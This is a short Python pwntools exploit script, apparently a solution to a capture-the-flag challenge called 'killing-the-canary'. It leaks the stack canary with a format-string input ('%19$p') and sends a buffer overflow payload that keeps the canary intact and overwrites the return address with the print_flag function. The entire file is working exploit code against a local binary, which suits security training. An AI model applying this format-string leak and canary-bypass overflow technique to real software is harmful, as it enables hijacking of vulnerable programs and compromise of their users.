#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

exe = ELF("./killing-the-canary")

r = process([exe.path])
# For debugging. Make sure to run `tmux` before running this 
# script with the following line uncommented
# gdb.attach(r)

flag = exe.symbols['print_flag']
r.recvuntil("What's your name? ")
r.sendline(b'%19$p')
result = r.recvline().decode()
canary = int(result[result.index('x')-1:], 16)

payload = b'a'*72 + p64(canary) + b'a'*8 + p64(flag)
r.recvuntil("What's your message? ")
r.sendline(payload) # receive one more time to only show the flag
r.recvline()

# Your exploit script goes here

r.interactive()
